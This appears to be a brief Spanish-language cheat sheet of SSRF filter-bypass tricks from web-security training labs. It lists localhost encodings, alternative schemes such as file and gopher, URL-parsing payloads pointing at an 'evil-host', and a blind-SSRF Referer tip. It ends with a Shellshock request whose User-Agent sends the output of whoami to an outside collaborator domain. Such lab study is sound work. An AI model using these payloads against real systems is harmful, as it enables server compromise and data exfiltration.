# Bypass WAF
Visualizar una respuesta diferente
```
localhost
127.0
192.168.x.x
2130706433
017700000001
```
Cambiar el servicio
```
http
https
file
gopher
```
No olvidar del url encoder
```
https://expected-host:fakepassword@evil-host
https://evil-host#expected-host
https://expected-host.evil-host
```

Recordar si tenemos una peticion de redireccion no necesariamente ahi tiene que explotarse, puede existir un endpoint que complete toda la redireccion en una misma peticion

$ Blind SSRF
- El el referer poner nuestro dominio para ver si recibimos peticiones

Shellshock
```
GET /product?productId=1 HTTP/2
Host: 0ae9001c047cc765803a21b000a900fb.web-security-academy.net
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).betdua4njywcb5uq0b0ocdzbo2utip6e.oastify.com
Referer: http://192.168.0.1:8080/
```
